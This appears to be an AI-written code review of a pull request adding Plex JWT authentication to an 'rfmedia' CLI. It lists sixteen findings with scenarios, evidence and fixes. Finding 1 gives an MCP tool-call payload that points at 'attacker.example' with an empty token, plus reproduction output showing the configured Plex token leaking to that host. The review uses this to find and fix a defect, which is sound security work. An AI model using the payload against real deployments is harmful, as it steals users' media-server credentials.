I confirmed each surviving finding against the code myself, and reproduced the top one end-to-end. Worktree left clean (no files edited).

## Finding 1 — critical — packages/rfmedia-cli/src/lib/adapters/index.ts:208

**Claim:** An explicitly-supplied _empty-string_ `plexToken` override disengages the cross-origin credential guard whenever a Plex auth store file exists on disk, sending the configured `plex.token` to an attacker-chosen origin. This is a regression this PR introduces at the exact line it changed.

**Failure scenario:** Config `plex.url: http://localhost:32400`, `plex.token: REAL-PLEX-TOKEN`, and the user has run `plex auth login` at least once (`store.json` exists). An MCP client calls `plex_query` with `{plexUrl: "http://attacker.example", plexToken: ""}` — `mcp/schema.ts:363` is `schemaOptional(schemaString())` with no `minLength`, so `""` validates, and `mcp/adapters.ts:295` forwards both raw. Trace: `staticToken = "" ?? token` → `""` (`??` does not coalesce empty string), so `!staticToken` is true but `!plexAuthStoreExistsSync(...)` is false → the presence gate **passes**; the guard at :217 tests `overrides.plexToken === undefined`, false for `""` → **skipped**; `selectPlexCredential`'s `if (cliToken)` is falsy → falls to branch 3 → returns `{kind:"static", token: "REAL-PLEX-TOKEN"}` bound to the attacker origin. Same reachable from the CLI as `--plex-token "$TOKEN"` with `TOKEN` unset in CI.

I reproduced it against a local listener:

```
ADAPTER CONSTRUCTED: true
ATTACKER GOT PATH: /library/sections
ATTACKER GOT TOKEN HEADER/QUERY: REAL-PLEX-TOKEN
```

On `master` the same input is refused: `const token = overrides?.plexToken ?? loadedConfig.token; if (!rawUrl || !token) return { ok: false, reason: "missing" };`

**Evidence:**

```ts
  const staticToken = overrides?.plexToken ?? loadedConfig.token;
  // Falsy, not `=== undefined`: an empty token has always meant "not configured"
  // here, and with no store on disk this stays byte-identical to the legacy gate.
  if (!rawUrl || (!staticToken && !plexAuthStoreExistsSync(storeDependencies))) {
    return { ok: false, reason: "missing" };
  }
  ...
  if (overrides?.plexUrl !== undefined && overrides.plexToken === undefined) {
```

The comment's own caveat is the bug: "_with no store on disk_ this stays byte-identical to the legacy gate" — with a store on disk it is not.

**Fix:** Keep :217 a presence test (per the standing repo lesson) and repair the gate. Immediately after computing `staticToken`, add:

```ts
if (overrides?.plexToken !== undefined && overrides.plexToken.length === 0) {
  return { ok: false, reason: "missing" };
}
```

That restores master's refusal byte-for-byte regardless of store presence. Add a `plex-adapter.test.ts` regression case alongside :770: store file present, config url+token set, `overrides = { plexUrl: "http://attacker.example", plexToken: "" }` must never resolve to the configured token.

## Finding 2 — medium — packages/rfmedia-cli/src/lib/adapters/plex/enrollment-client.ts:342

**Claim:** HTTP 404 is classified as `PLEX_AUTH_ENROLLMENT_EXPIRED` for _every_ plex.tv account endpoint, including the two whose paths this PR itself quarantines as never-observed, sending refresh failures into an unbounded re-enrollment loop.

**Failure scenario:** `PLEX_TOKEN_PATH = "/api/v2/auth/token"` is quarantined as U1 ("Its success body has NEVER been observed"), so a wrong path/version is exactly the expected production failure and returns 404. `rfmedia plex auth refresh` → `exchangeDeviceAssertion` (:486) → 404 → `classifyWireFailure` → `PLEX_AUTH_ENROLLMENT_EXPIRED` → the user is told "The Plex authorization code expired before it was claimed. Run: `rfmedia plex auth login`". `enrollPlexClient` uses only `createPin`/`readPin` (verified pins endpoints), so login **succeeds**, minting a fresh Ed25519 key pair and clientIdentifier — a new plex.tv Authorized Devices entry, old credential invalidated. The next `refresh` 404s identically. `createNonce` (:461) has the same exposure.

**Evidence:**

```ts
if (status === 404) {
  // The only reachable 404 is an unknown pin (VERIFIED as code 1020), which
  // for the user means the authorization code is gone.
  return "PLEX_AUTH_ENROLLMENT_EXPIRED";
}
```

"The only reachable 404 is an unknown pin" holds only for `readPin`; all four callers route through the same `#send`. Two lines below, the module already scopes per endpoint: `return failure.code === PLEX_WIRE_CODE_JWK_NOT_FOUND ? keyRejectionCode : "PLEX_AUTH_INVALID_RESPONSE";`

**Fix:** Add a per-endpoint `notFoundCode: PlexAuthErrorCode` to the request record alongside the existing `keyRejectionCode` — `"PLEX_AUTH_ENROLLMENT_EXPIRED"` from `createPin`/`readPin`, `"PLEX_AUTH_INVALID_RESPONSE"` from `createNonce`/`exchangeDeviceAssertion` — and change :342 to `return request.notFoundCode;`. Test that a 404 on `PLEX_TOKEN_PATH` does not yield `ENROLLMENT_EXPIRED`.

## Finding 3 — medium — packages/rfmedia-cli/src/lib/adapters/plex/enrollment-refresh.ts:166

**Claim:** The two refresh pipelines compute `observedSkewSeconds` with **opposite signs** and both write it to the same persisted `lastObservedSkewSeconds` field that `plex auth status` renders.

**Failure scenario:** Local clock 200 s **ahead** of plex.tv. (a) A copy/query triggers the in-adapter rotation → `jwt-provider.ts:416` persists `+200`; `plex auth status` prints "Last observed clock skew 200s." (b) The user instead runs `rfmedia plex auth refresh` → `enrollment-refresh.ts:166` persists `-200`; status prints "-200s." Same host, same physical skew, inverted sign depending only on which path last rotated — and the operator uses that sign to decide which direction to correct NTP. This is hit on **every** successful refresh; there are no exotic preconditions. `#warnOnceOnClockSkew` masks it with `Math.abs`, the refresh verb emits no warning, and only the provider sign has a test (`jwt-provider.test.ts:306`), which is why it shipped.

**Evidence:**

```ts
// enrollment-refresh.ts:166   (server − local)
observedSkewSeconds: issue.receivedAtEpochSeconds - epochSeconds(input.now),

// jwt-provider.ts:416         (local − server)
const observedSkewSeconds = this.#nowSeconds() - issue.receivedAtEpochSeconds;
```

Both feed the same `{kind:"issue", observedSkewSeconds}` mutation → `credential-store-document.ts:319` `target.lastObservedSkewSeconds` → `enrollment.ts:446` `clockSkewSeconds` → `commands/plex-auth.ts:216`.

**Fix:** Adopt the provider convention (local − server; positive = local clock ahead — it matches the warning text "Local clock appears off by ~N seconds"). Change :166 to `epochSeconds(input.now) - issue.receivedAtEpochSeconds`, document the sign on the mutation field and on `PlexAuthStatusResult.clockSkewSeconds`, and add a refresh-verb test mirroring `jwt-provider.test.ts:296-306`.

## Finding 4 — medium — packages/rfmedia-cli/src/lib/adapters/plex/jwt-provider.ts:243

**Claim:** The proactive `getToken()` refresh path has no per-process cap and persists no cooperative back-off for any failure other than HTTP 429, so a repeatable refresh failure spends nonces against the IP-scoped budget on every call until plex.tv rate-limits the whole household IP.

**Failure scenario:** Local clock >300 s ahead of plex.tv (NTP drift, VM resume) with a `refresh-soon` credential. Each `getToken()` → `#refresh` → `#obtainFreshNonce` fetches a nonce, finds it stale, re-fetches, and throws `PLEX_AUTH_CLOCK_SKEW` — **2 nonces per call**. `planCooperativeBackoff` rethrows anything that is not `PLEX_AUTH_RATE_LIMITED`, so `mutations` is never returned and no cooperative window is written. `PLEX_MAX_REACTIVE_REFRESHES_PER_PROCESS = 2` guards only `handleAuthFailure` (:270-272); nothing guards `getToken`. A `rfmedia copy … --plex-per-source` over 5 sources makes 5 independent `getToken()` calls (per-source scan failures are caught and the loop continues) = 10 nonces = the entire documented 10-per-300 s IP budget, locking out every Plex client behind that IP for five minutes. The same loop applies to `PLEX_AUTH_INVALID_RESPONSE` at 1 nonce per call — which is _expected reachable_ because U1/U2 (the token-response body shape) were never observed live.

Note: the mechanism is sequential calls, not an inner retry — `const token = await this.#getToken(...)` at `client.ts:249` throws straight out of `request()`, so one request costs at most one refresh.

**Evidence:**

```ts
const handle = this.#requireStore();
if (handle.credentialState.kind === "fresh") {
  return this.#publish(readStoredCredential(handle, this.#connection.origin));
}
return await this.#refresh({ signal: options?.signal }); // no budget, no backoff
```

```ts
if (!(error instanceof PlexAuthError) || error.code !== "PLEX_AUTH_RATE_LIMITED") throw error;
```

The module header asserts the opposite: _"A refresh spends one of an IP-scoped budget of ten nonces per 300 s, so burning a redundant one can lock a user out for five minutes."_

**Fix:** Two complementary changes. (a) Extend the per-store per-process budget to the proactive path — increment `reactiveRefreshBudget` (rename to `refreshBudget`) for every _started_ refresh in `#refresh`, and fail fast with the last error once the cap is hit. (b) In `planCooperativeBackoff`, persist a short `back-off` mutation for the terminal non-429 codes `PLEX_AUTH_CLOCK_SKEW` and `PLEX_AUTH_INVALID_RESPONSE` before rethrowing, so peers and later calls decline with zero network calls. Add a test: three consecutive `getToken()` calls against a stub that always throws `PLEX_AUTH_INVALID_RESPONSE` must issue at most N nonces.

## Finding 5 — medium — packages/rfmedia-cli/src/lib/adapters/plex/jwt-provider.ts:319

**Claim:** `#refresh` joins an in-flight refresh unconditionally, discarding `request.rejectedCredential`, so the reactive 401 path can be handed back the exact credential the Plex Media Server just rejected.

**Failure scenario:** Store holds `K1`, written moments ago by a peer process. Two concurrent replayable requests on one adapter. R1 read the store before the peer's write (state `refresh-soon` on `K0`) and enters `#refresh({signal})` with **no** `rejectedCredential`; under the lock it re-reads, sees `K1` fresh, and adopts it with zero network calls — promise still pending. R2's in-flight request with `K1` returns 401 (server-side revocation); `handleAuthFailure` sees `inFlightRefreshes.has(storePath)`, skips the budget, calls `#refresh({rejectedCredential: K1})` → `existing !== undefined` → returns R1's promise → resolves to **`K1`** → returns `"retry"`. R2 replays with the identical rejected credential, gets 401 again, and `allowAuthRetry` is now false, so the user sees a bare `Plex authentication failed (HTTP 401)` where a genuine second refresh would have recovered. The `#planRefresh` guard `held !== request.rejectedCredential` (:359) — whose entire purpose is this case — never executes for the joiner.

**Evidence:**

```ts
  #refresh(request: PlexRefreshRequest): Promise<string> {
    const existing = inFlightRefreshes.get(this.#storePath);
    if (existing !== undefined) return existing;      // rejectedCredential discarded
```

against the documented contract at :164-172: _"A re-read that yields this exact value is NOT an adoptable peer refresh — it is the credential that already failed — so the refresh proceeds."_

**Fix:** Do not blind-join when the caller supplies a rejected credential:

```ts
const existing = inFlightRefreshes.get(this.#storePath);
if (existing !== undefined) {
  const joined = await existing;
  if (request.rejectedCredential === undefined || joined !== request.rejectedCredential) return joined;
  // fall through: the in-flight refresh produced the very credential the server refused
}
```

(subject to the reactive budget). Add a test with two providers over one store where the joiner supplies the leader's adopted credential as `rejectedCredential`.

## Finding 6 — low — packages/rfmedia-cli/src/lib/adapters/plex/enrollment-refresh.ts:174

**Claim:** `singleFlightLeader: false` is returned on the ordinary "already fresh, nothing to do" path, not only on peer adoption, so the most common invocation of `plex auth refresh` asserts a concurrent process rotated the credential when none exists.

**Failure scenario:** Single machine, no other rfmedia process, credential fresh. `rfmedia plex auth refresh` → `decideRefresh:233` takes `state.kind === "fresh" && !input.force` → `adoptCurrentCredential` → `singleFlightLeader: false` → the command prints "Adopted a credential rotated by a concurrent rfmedia process." That is false. Machine consumers get the same wrong signal in the `--output json` envelope, so a script counting concurrent rotations over-reports on every no-op refresh. No test covers the field.

**Evidence:**

```ts
function adoptCurrentCredential(handle: PlexAuthStoreHandle): PlexRefreshResult {
  return Object.freeze({
    refreshed: false,
    reason: "already-fresh" as const,
    singleFlightLeader: false,
```

```ts
if (state.kind === "fresh" && !input.force) {
  return { mutations: [], result: { kind: "done", result: adoptCurrentCredential(current) } };
}
```

against the field's own contract at :71-72: _"False when a peer's credential was adopted under the lock with zero calls."_

**Fix:** Give `adoptCurrentCredential` a `peerAdopted: boolean` parameter; pass `false` (→ `singleFlightLeader: true`, this process _was_ the leader and simply had nothing to do) from the plain fresh/no-force branch, reserving `false` for a genuine peer adoption. Add tests for both renderings.

## Finding 7 — low — packages/rfmedia-cli/src/lib/adapters/plex/jwt-provider.ts:332

**Claim:** `PLEX_REFRESH_BUDGET_MS` is documented as a hard ceiling "covering the cross-process lock wait AND both network calls" but only reaches `acquireExclusiveLock`; the maximum legal lock hold (135 s) exceeds `SECURE_STORE_LOCK_MAX_AGE_MS` (120 s), so a peer can steal a lock whose owner is still mid-refresh.

**Failure scenario:** Worst legal path per account call is `15 s fetch timeout + ≤15 s honored Retry-After + 15 s fetch timeout = 45 s` (`DEFAULT_ACCOUNT_TIMEOUT_MS = 15_000`, `MAX_ATTEMPTS = 2`, `PLEX_RETRY_AFTER_WAIT_CAP_SECONDS = 15`). `#obtainFreshNonce` may make two `createNonce` calls (90 s) plus one `exchangeDeviceAssertion` (45 s) = 135 s. `createdAt` is stamped once at acquisition with no heartbeat, so at T0+121 s a peer declares the live owner's lock stale, unlinks it, and issues its own credential. Both spend nonces; the loser's CAS then fails with `PLEX_AUTH_STORE_VERSION_CONFLICT`. The CAS does prevent a lost update, so this is nonce waste plus a spurious user-visible error, not corruption.

**Evidence:**

```ts
    const outcome = await withPlexAuthStoreLock<PlexRefreshOutcome>(
      this.#storeDependencies(),
      { deadlineEpochMs: this.#now() + PLEX_REFRESH_BUDGET_MS, signal: request.signal },
      async (current) => this.#planRefresh(current, request),   // unbounded network work inside
```

`runUnderStoreLock` forwards `budget.deadlineEpochMs` only to `acquireExclusiveLock`; `await mutate(...)` receives no derived deadline. `lock.ts:242`: `return nowEpochMs - Date.parse(record.createdAt) > SECURE_STORE_LOCK_MAX_AGE_MS;`

**Fix:** Make the budget real: derive `AbortSignal.any([request.signal, AbortSignal.timeout(PLEX_REFRESH_BUDGET_MS)])` in `#performRefresh` and thread it into `#planRefresh`/`#issueCredential`, so the worst-case hold stays under the 120 s steal threshold. Otherwise add a lock heartbeat or raise `SECURE_STORE_LOCK_MAX_AGE_MS`, and correct the JSDoc at :66-71 either way.

## Finding 8 — low — packages/rfmedia-cli/src/lib/adapters/plex/enrollment-refresh.ts:255

**Claim:** The duplicated refresh pipeline diverges from the provider on clock-skew handling: one discards a credential plex.tv already issued (zero mutations, no back-off, zero-second threshold), the other persists it with a 60 s tolerance.

**Failure scenario:** Local clock modestly ahead (≤300 s, so `requireFreshNonce` passes) and plex.tv declares a short `expires_in` (a genuinely unverified quantity — U2 records that no lifetime field has ever been observed). `rfmedia plex auth refresh` spends a nonce, signs, exchanges successfully, then returns `mutations: []` — the fresh credential is thrown away and nothing is persisted, not even the observed skew. `PLEX_AUTH_CLOCK_SKEW`'s remediation is literally "Synchronize this system's clock, then run: `rfmedia plex auth refresh`", so each re-run burns another nonce with zero persisted progress. The provider path in the identical situation _does_ persist. The thresholds also disagree (`<= nowSeconds` vs `<= -PLEX_AUTH_EXPIRY_SKEW_TOLERANCE_SECONDS`), as does the assertion lifetime for the same operation (`ASSERTION_LIFETIME_SECONDS = 1800` in `enrollment-support.ts:40` vs `PLEX_ASSERTION_LIFETIME_SECONDS = 60` in `jwt-provider.ts:77`).

**Evidence:**

```ts
const expiresAtEpochSeconds = issued.issuedAtEpochSeconds + issued.grant.lifetimeSeconds;
if (expiresAtEpochSeconds <= nowSeconds) {
  return { mutations: [], result: { kind: "clock-skew" } };
}
```

```ts
const secondsRemaining = issued.issuedAtEpochSeconds + issued.grant.lifetimeSeconds - nowSeconds;
if (secondsRemaining <= -PLEX_AUTH_EXPIRY_SKEW_TOLERANCE_SECONDS) {
  return { mutations, result: { kind: "failure", error: new PlexAuthError("PLEX_AUTH_CLOCK_SKEW") } };
}
```

**Fix:** Adopt the provider semantics here (return the `issue` mutation alongside `{kind:"clock-skew"}` and use `-PLEX_AUTH_EXPIRY_SKEW_TOLERANCE_SECONDS`), then follow up by hoisting the four near-identical pairs — `requireFreshNonce`/`#obtainFreshNonce`, `issueRefreshedCredential`/`#issueCredential`, `toBackOffOutcome`/`planCooperativeBackoff`, and the assertion-lifetime constant — into one shared module so the pipelines cannot drift again. Same seam as findings 3 and 8.

## Finding 9 — low — packages/rfmedia-cli/src/lib/adapters/index.ts:208

**Claim:** The first-run case for `plex.auth.mode: "jwt"` never reaches the `not-enrolled` branch; the presence gate short-circuits it into `missing`, whose message tells a JWT-mode user to set the exact credential that mode exists to retire.

**Failure scenario:** User sets `plex.url` + `plex.auth.mode: "jwt"`, removes `plex.token`, and runs `rfmedia plex query …` before `plex auth login`. At :208 `staticToken` is `undefined` and `plexAuthStoreExistsSync` is `false`, so the gate returns `missing` and `selectPlexCredential` — with the whole jwt branch and its `not-enrolled` reason — never runs. The user gets "Plex URL and token are required. Set in config or use --plex-url and --plex-token" instead of `PlexAuthError("PLEX_AUTH_NOT_ENROLLED")` whose remediation is "Run: `rfmedia plex auth login`". The actionable message is reachable only in the _rarer_ already-enrolled-wrong-origin case.

**Evidence:** the :208 gate quoted in Finding 1, versus the branch it makes unreachable at :168-173:

```ts
return (
  resolveEnrolledCredential(storeDependencies, origin, refreshMarginSeconds) ?? {
    ok: false,
    reason: "not-enrolled",
  }
);
```

**Fix:** Fold into the Finding 1 gate change: `if (!rawUrl || (loadedConfig.auth?.mode !== "jwt" && !staticToken && !plexAuthStoreExistsSync(storeDependencies)))`, so jwt mode falls through to `selectPlexCredential` and surfaces `not-enrolled`. Add a test for jwt mode + no store + no token.

## Finding 10 — low — packages/rfmedia-cli/docs/features/plex-configuration.md:342 (and README.md:3921, CLAUDE.md:1111, AGENTS.md:1075, src/commands/plex-auth.ts:87)

**Claim:** Four documents and the command's own JSDoc state that a trailing `--output json` is not parsed and that the flag must precede the subcommand. It is parsed, in every format.

**Failure scenario:** An operator writing a monitoring script reads the code block, believes trailing `--output json` is unsupported, and rewrites working automation — or files a bug against correct behavior. I ran it on this branch:

```
$ RFMEDIA_PLEX_AUTH_DIR=<clean 0700 dir> npx tsx src/cli.ts plex auth status --output json
{ "command": "plex-auth-status", "result": { "enrolled": false, ... } }   # exit 0
```

`--json`/`--output` are declared on `program` and Commander is not in positional-options mode, so a trailing occurrence still binds to the root, which is what `resolveOutputFormat()` reads.

**Evidence:**

```md
rfmedia plex auth status --output json # NOT parsed as JSON
```

```ts
 * `--output` is reconciled against `--json` by `cli.ts`'s `preAction` hook, and
 * is only honoured on the ROOT command, so `--output json` must precede `plex`.
```

**Fix:** Delete the "NOT parsed as JSON" line and the "must precede the subcommand" constraint from all four docs and the JSDoc; state instead that `--output`/`--json` are root options reconciled by the `preAction` hook and honored in either position. Optionally pin it with a `plex-auth.test.ts` case.

## Finding 11 — low — packages/rfmedia-cli/src/commands/plex-auth.ts:249

**Claim:** `PlexRefreshResult.retryAfterSeconds` is `null` at every producer, so this rendering branch is dead and the field is a permanently-null part of the `--output json` contract.

**Failure scenario:** A user hitting a persisted cooperative back-off runs `plex auth refresh --output json` expecting the documented "next rotation allowed in Ns" value. It never arrives — the rate-limited outcome is re-thrown as `PlexAuthError("PLEX_AUTH_RATE_LIMITED")` and rendered by the _failure_ envelope; the success envelope always carries `"retryAfterSeconds": null`.

**Evidence:** both producers hard-code it (`enrollment-refresh.ts:177` and `:278`), while the only path holding a number throws:

```ts
if (outcome.kind === "rate-limited") {
  throw new PlexAuthError("PLEX_AUTH_RATE_LIMITED", { retryAfterSeconds: outcome.retryAfterSeconds });
}
```

so `if (result.retryAfterSeconds !== null)` can never be true.

**Fix:** Remove the field from `PlexRefreshResult` and delete the dead branch at :249-251 — the wait is already served by the failure envelope (`plex-auth.ts:163`). Matches the repo's no-dead-code rule.

## Finding 12 — low — packages/rfmedia-cli/src/lib/secure-store/atomic.ts:122

**Claim:** `createPrivateFileAtomically` publishes with `link()` and unlinks the staging file only afterwards, so a kill in that window orphans a `0600` temp file containing the **full store document — PKCS#8 private key and credential included** — and nothing ever cleans it up.

**Failure scenario:** `plex auth login` performs the first store write (`credential-store.ts:407` uses this writer for the create path, with the serialized document as `text`). `link(temporaryPath, input.path)` succeeds; the process is SIGKILLed before `removeIfPresent`. `.plex-auth-store.<uuid>.tmp` remains forever with `privateKeyPkcs8Pem` and `credential`. `plex auth logout` unlinks only `store.json` (`destroyDocument`), so the "destroys the local root of authority" guarantee is false while an orphan exists; repeated crashes accumulate copies. No cross-user disclosure (0600 inside a 0700 dir).

**Evidence:**

```ts
      await link(temporaryPath, input.path);
    ...
    await assertOpenedFileIdentity(input.path, identity, input.subject);
    await assertSafeParentUnchanged(parent, input.subject);
    await removeIfPresent(temporaryPath);   // unreached on SIGKILL
```

(`replacePrivateFileAtomically` is unaffected — `rename` consumes the temp.)

**Fix:** In `destroyDocument`, after unlinking `store.json`, `readdir` the parent and unlink any entry matching `.${PLEX_AUTH_STORE_TEMPORARY_ID}.*.tmp` before `syncDirectory`. Optionally sweep the same pattern at enrollment start so orphans do not accumulate.

## Finding 13 — low — packages/rfmedia-cli/src/commands/plex-auth.ts:197

**Claim:** Two doc tables tell operators that `plex auth status` reports `lockPath`, but the human renderer — the default output mode — never prints it.

**Failure scenario:** `plex auth refresh` fails with `PLEX_AUTH_REFRESH_BUSY`. Following the doc row, the operator runs `rfmedia plex auth status` to find the lock file, and the field is simply absent with no hint that a machine format is required. Mitigated: the `PLEX_AUTH_REFRESH_BUSY` remediation interpolates the path itself, so the operator is misdirected rather than blocked.

**Evidence:** `enrollment.ts:436` populates `lockPath: handle.lockPath`, but `renderStatus` prints only `storePath`/`storeMode`/`storeOwnerOnly`, credential state, skew and origins — no `lockPath` anywhere. Docs: ``| Lock file | `<storePath>.lock`, reported by `plex auth status` as `lockPath` |`` (plex-configuration.md:377) and :658.

**Fix:** One line in `renderStatus` after the store line — `logInfo(\`Lock ${result.lockPath}\`);`— or amend the two doc cells to say the field is exposed in`--output json|yaml|csv`.

## Finding 14 — low — ROADMAP.md:10

**Claim:** `**Open issues:** 87 (rfapps 40 · rfmedia 47)` does not reconcile with the document's own tables, which contain 88 distinct issue links (rfapps 40, rfmedia 48).

**Failure scenario:** The next maintainer follows the `## Maintenance` instruction to regenerate counts with `gh issue list`, gets 88, sees the header say 87, and cannot tell which is authoritative. Aggravating detail: master's tip already reads `88 (rfapps 40 · rfmedia 48)` — this branch edited the line from `85 (40 · 45)` to `87 (40 · 47)` off the merge base, so the edit is also a merge-conflict candidate against current master.

**Evidence:** scripted count of the two backlog sections on this branch: `## rfapps-cli backlog 40`, `## rfmedia-cli backlog 48`, `total 88`, against line 10's `87 (rfapps 40 · rfmedia 47)`.

**Fix:** Rebase and regenerate the header from `gh issue list` in one pass (`88 (rfapps 40 · rfmedia 48)` minus #251, which closes on merge), and drop the now-closed #208 rows at :59 and :199 plus the "next dependency for Layer 3 intelligence" prose at :38 if that reconciliation removes them.

## Finding 15 — low — packages/rfmedia-cli/src/lib/adapters/plex/credential-cell.ts:48

**Claim:** `validateOpaqueCredential` is exported but imported by nothing — it is only called from two functions in its own module, and it was module-private in `auth.ts` before the move.

**Failure scenario:** No runtime failure. It widens the private-adapter surface for no consumer, against the repo's no-dead-code / minimal-public-surface rules; `grep -rn validateOpaqueCredential src` returns exactly three hits, all in `credential-cell.ts` (the export at :48 and the call sites at :130 and :158).

**Evidence:**

```ts
export function validateOpaqueCredential(token: string): string {
```

**Fix:** Drop the `export` keyword. Nothing else changes.

## Finding 16 — low — packages/rfmedia-cli/src/lib/shell-completions/bash.ts:112

**Claim:** bash offers `--timeout` as a flag candidate but has no `--timeout)` arm in its `case "$prev"` value dispatch, while zsh and fish both suggest `60 120 300 900` — and `templates.spec.ts:1453` pins only the zsh/fish lists, so the asymmetry is now locked in by test.

**Failure scenario:** A bash user types `rfmedia plex auth login --timeout <TAB>` and gets an empty completion, then has to read `--help` for the units/range, while a zsh or fish user on the same build is handed four values. bash _does_ have this convention for other numeric flags (`--max-per-seed)` at generated line 330, `--limit)` at 435), so it is a deviation from the file's own pattern, not a shell limitation.

**Evidence:**

```
112:  local plex_auth_login_opts="--plex-url --device-name --timeout -y --yes"
114:  local plex_auth_refresh_opts="--plex-url --timeout --force"
```

`grep -n '\-\-timeout)' bash.ts` → no match.

**Fix:** Add the arm alongside the existing numeric-flag arms:

```bash
    --timeout)
      COMPREPLY=($(compgen -W "60 120 300 900" -- "$cur"))
      return ;;
```

and extend `templates.spec.ts:1453` with a bash candidate array so the three shells stay in lockstep.

## Verdict

- **MERGE-BLOCKING: 1** — Finding 1: empty-string `--plex-token` / MCP `plexToken: ""` bypasses the cross-origin credential guard and exfiltrates the configured `plex.token` to a caller-supplied origin (reproduced; regression vs master).
- **SHOULD-FIX-BEFORE-MERGE: 4** — Finding 2 (unscoped 404 → re-enrollment loop on the U1-quarantined token endpoint); Finding 3 (inverted `observedSkewSeconds` sign between the two refresh pipelines); Finding 4 (uncapped proactive refresh burns the IP nonce budget with no persisted back-off); Finding 5 (`#refresh` joiner returns the credential the PMS just rejected).
- **OPTIONAL / FOLLOW-UP: 11** — Findings 6 (false "adopted by a concurrent process"), 7 (refresh budget doesn't bound in-lock work; 135 s hold vs 120 s steal), 8 (clock-skew persist/threshold/assertion-lifetime divergence + pipeline de-duplication), 9 (jwt-mode first-run message), 10 (four docs assert a working invocation is broken), 11 (dead `retryAfterSeconds` branch), 12 (orphaned temp file holds the private key; logout doesn't sweep), 13 (`lockPath` missing from text status), 14 (ROADMAP count drift / merge-conflict candidate), 15 (unnecessary `export`), 16 (bash `--timeout` completion gap).

The engineering here is genuinely strong: the six backward-compatibility files are byte-identical to master, the CAS + inode/version store protocol, the `O_NOFOLLOW`/`lstat`-walk path hardening, the RFC 7638/8037 crypto (verified against known-answer vectors by one reviewer), the frozen error tables, and the U1..U6 protocol quarantine are all better than typical. But Finding 1 is a real credential-exfiltration regression reachable from untrusted MCP tool arguments, introduced at the exact line this PR rewrote, and it defeats the specific invariant the repo has a standing lesson about — that alone blocks merge. Once Finding 1 is fixed with a regression test (and Finding 9 folded into the same gate change), and Findings 2-5 are addressed — 2 and 3 are a few lines each; 4 and 5 are small, well-scoped changes to `jwt-provider.ts` — this is safe to merge. The optional items are all cosmetic, diagnostic, or documentation and can ship as follow-ups. One caveat that no code change removes: this shipped without a live Plex account test, so the U1/U2 token-response path is untested against the real service; Finding 2 matters disproportionately because it determines whether that unknown surfaces as an actionable protocol error or as an endless re-enrollment loop that mints a new device on plex.tv each cycle.
